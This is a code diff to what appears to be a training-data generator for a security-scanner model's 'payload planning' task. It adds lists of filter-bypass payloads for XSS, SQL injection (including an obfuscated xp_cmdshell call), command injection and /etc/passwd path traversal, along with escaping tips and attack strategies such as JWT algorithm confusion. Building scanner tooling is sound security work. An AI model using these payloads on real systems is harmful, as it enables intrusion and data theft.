@@ -168,37 +168,116 @@ def _task_a_samples(n: int) -> Iterator[dict]:
 
 # ── Task B 샘플 생성 ─────────────────────────────────────────────────────────
 
+_BYPASS_VARIANTS: dict[str, list[str]] = {
+    "xss": [
+        "%3Cscript%3Ealert(1)%3C/script%3E",
+        "<scr\x00ipt>alert(1)</scr\x00ipt>",
+        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
+        "<svg/onload=&#97;lert(1)>",
+        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+    ],
+    "sqlinjection": [
+        "' OR 1=1-- -",
+        "%27 OR %271%27%3D%271",
+        "' OR/**/'1'='1",
+        "';EXEC(CHAR(0x78,0x70,0x5f,0x63,0x6d,0x64,0x73,0x68,0x65,0x6c,0x6c))--",
+        "1 AND SLEEP(5)#",
+    ],
+    "oscommand": [
+        "%3B+id",
+        "|+whoami",
+        "`id`",
+        "$(id)",
+        "%0aid",
+    ],
+    "path_traversal": [
+        "..%2F..%2Fetc%2Fpasswd",
+        "....//....//etc/passwd",
+        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "..%252f..%252fetc%252fpasswd",
+        "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+    ],
+}
+
+_CONTEXT_NOTES: dict[str, str] = {
+    "html_body":      "No quote escaping needed; inject directly",
+    "html_attribute": "Close the attribute with \" or ' before injecting",
+    "js_string":      "Escape the string with \\' or \"; use \\n for line break",
+    "url_param":      "URL-encode special characters; double-encode for bypass",
+    "json_value":     "Escape JSON string; \\\" for quote injection",
+    "sql_string":     "Single-quote injection; comment with -- or #",
+    "sql_numeric":    "No quotes needed; inject directly after numeric value",
+    "shell_arg":      "Semicolon/pipe/backtick for command chaining",
+    "path_segment":   "Use ../ traversal or null bytes",
+}
+
+
 def _task_b_samples(n: int) -> Iterator[dict]:
-    """Payload Planning 샘플."""
-    contexts = ["html_body", "html_attribute", "js_string", "url_param", "json_value", "xml_node"]
+    """Payload Planning 샘플 (Week 3: bypass_variants + context_notes 추가)."""
+    contexts = [
+        "html_body", "html_attribute", "js_string", "url_param",
+        "json_value", "xml_node", "sql_string", "sql_numeric", "shell_arg", "path_segment",
+    ]
+
+    dom_samples = [
+        "<input name='{param}' type='text' value=''>",
+        "<input name='{param}' type='hidden' value='1'>",
+        "<textarea name='{param}'></textarea>",
+        "<input name='{param}' type='search' placeholder='Search...'>",
+        "",  # DOM 없는 경우
+    ]
+
+    response_samples = {
+        "xss": ["Input reflected: {p}", "Search results for {p}", ""],
+        "sqlinjection": ["DB Error: {p}", "SQL syntax error near {p}", ""],
+        "oscommand": ["Output: {p}", "Command result: {p}", ""],
+        "path_traversal": ["File not found: {p}", "Cannot open {p}", ""],
+    }
+
+    strategy_map = {
+        "xss": "Inject script tags and event handlers targeting reflection points",
+        "sqlinjection": "Boolean-based blind then time-based, escalate to UNION",
+        "oscommand": "Pipe and semicolon delimiters with id/whoami confirmation",
+        "path_traversal": "Relative path traversal with encoding bypass",
+        "csrf": "Cross-origin form submission without token",
+        "file_upload": "Bypass extension filters with double extensions",
+        "jwt": "Algorithm confusion attack (none/HS256 with RS256 key)",
+        "brute_force": "Credential list attack on login endpoint",
+        "soft_brute_force": "Slow credential test respecting rate limits",
+        "autobot": "Reflect user input back through stored/reflected vectors",
+        "sensitive_files": "Common backup and configuration file paths",
+        "react2shell": "Server-side template injection via template syntax",
+    }
 
     for _ in range(n):
         plugin = random.choice(_PLUGINS)
         param = random.choice(_PARAMS)
         context = random.choice(contexts)
-        payloads = _PLUGIN_PAYLOADS.get(plugin, ["test"])
-        # 4~8개 랜덤 선택
-        selected = random.sample(payloads * 3, min(len(payloads), random.randint(4, 8)))
-        strategy_map = {
-            "xss": "Inject script tags and event handlers targeting reflection points",
-            "sqlinjection": "Boolean-based blind then time-based, escalate to UNION",
-            "oscommand": "Pipe and semicolon delimiters with id/whoami confirmation",
-            "path_traversal": "Relative path traversal with encoding bypass",
-            "csrf": "Cross-origin form submission without token",
-            "file_upload": "Bypass extension filters with double extensions",
-            "jwt": "Algorithm confusion attack (none/HS256 with RS256 key)",
-            "brute_force": "Credential list attack on login endpoint",
-            "soft_brute_force": "Slow credential test respecting rate limits",
-            "autobot": "Reflect user input back through stored/reflected vectors",
-            "sensitive_files": "Common backup and configuration file paths",
-            "react2shell": "Server-side template injection via template syntax",
-        }
-        user = json.dumps({"plugin": plugin, "parameter": param, "context": context}, ensure_ascii=False)
+        dom_tpl = random.choice(dom_samples).replace("{param}", param)
+        payloads_pool = _PLUGIN_PAYLOADS.get(plugin, ["test"])
+        selected = random.sample(payloads_pool * 3, min(len(payloads_pool), random.randint(4, 8)))
+        bypass = random.sample(
+            _BYPASS_VARIANTS.get(plugin, ["test"]) * 3,
+            min(len(_BYPASS_VARIANTS.get(plugin, ["test"])), random.randint(2, 5)),
+        )
+        context_note = _CONTEXT_NOTES.get(context, "Standard injection context")
+
+        user_data: dict = {"plugin": plugin, "parameter": param, "injection_context": context}
+        if dom_tpl:
+            user_data["dom_snippet"] = dom_tpl
+        resp_list = response_samples.get(plugin, [""])
+        resp = random.choice(resp_list).replace("{p}", selected[0] if selected else "")
+        if resp:
+            user_data["response_snippet"] = resp
+
+        user = json.dumps(user_data, ensure_ascii=False)
         assistant = json.dumps({
             "payloads": selected,
+            "bypass_variants": bypass,
             "strategy": strategy_map.get(plugin, "Systematic payload testing"),
+            "context_notes": context_note,
         }, ensure_ascii=False)
-        yield make_sample(TASK_B_SYSTEM, f"Generate test payloads:\n{user}", assistant)
+        yield make_sample(TASK_B_SYSTEM, f"Generate optimized security test payloads:\n{user}", assistant)
 
 
 # ── Task C 샘플 생성 ─────────────────────────────────────────────────────────
